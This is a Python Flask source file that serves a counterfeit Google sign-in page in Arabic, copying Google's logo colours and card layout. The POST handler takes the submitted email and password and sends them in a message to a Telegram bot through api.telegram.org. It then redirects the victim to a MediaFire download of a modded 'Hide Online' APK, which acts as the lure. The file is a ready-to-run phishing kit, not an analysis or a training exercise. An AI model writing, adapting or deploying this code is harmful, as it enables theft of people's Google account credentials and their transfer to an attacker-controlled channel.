import os
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

MEDIAFIRE_URL = (
    "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod"
    "__40_Updated__41_.apk/file"
)


@app.route("/", methods=["GET", "POST"])
def login():
  if request.method == "POST":
    email = request.form.get("email")
    password = request.form.get("password")

    # إرسال البيانات إلى بوت تيليجرام
    if BOT_TOKEN and CHAT_ID:
      msg = (
          "📩 تم استلام بيانات جديدة:\n\n📧 البريد:"
          f" {email}\n🔑 الباسورد: {password}"
      )
      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

    # التوجيه لرابط التحميل
    return redirect(MEDIAFIRE_URL)

  return render_template_string("""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; padding: 0; margin: 0; }
        
        /* تمديد الصفحة لتملأ الشاشة بالكامل على الهواتف */
        .google-card { background: #fff; width: 100%; height: 100vh; padding: 40px 25px; border: none; border-radius: 0; text-align: center; display: flex; flex-direction: column; justify-content: center; }

        /* للشاشات الكبيرة (الكمبيوتر) تعود كبطاقة متوسطة في المنتصف */
        @media (min-width: 768px) {
            body { background: #f0f2f5; padding: 20px; }
            .google-card { height: auto; max-width: 450px; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
        }

        .google-logo { font-size: 32px; font-weight: 500; margin-bottom: 12px; letter-spacing: -0.5px; }
        .google-logo span:nth-child(1) { color: #4285F4; }
        .google-logo span:nth-child(2) { color: #EA4335; }
        .google-logo span:nth-child(3) { color: #FBBC05; }
        .google-logo span:nth-child(4) { color: #4285F4; }
        .google-logo span:nth-child(5) { color: #34A853; }
        .google-logo span:nth-child(6) { color: #EA4335; }

        h2 { color: #202124; font-size: 26px; font-weight: 400; margin-bottom: 8px; }
        p { color: #5f6368; font-size: 16px; margin-bottom: 35px; }

        .input-group { margin-bottom: 20px; text-align: right; }
        .input-group input { width: 100%; padding: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; transition: border 0.2s; background: transparent; }
        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px; }

        .submit-btn { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; margin-top: 10px; }
        .submit-btn:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="google-card">
        <div class="google-logo">
            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
        </div>
        <h2>تسجيل الدخول</h2>
        <p>استخدم حساب Google الخاص بك</p>
        <form method="POST">
            <div class="input-group">
                <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
            </div>
            <div class="input-group">
                <input type="password" name="password" required placeholder="أدخل كلمة المرور">
            </div>
            <button type="submit" class="submit-btn">التالي</button>
        </form>
    </div>
</body>
</html>
""")


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
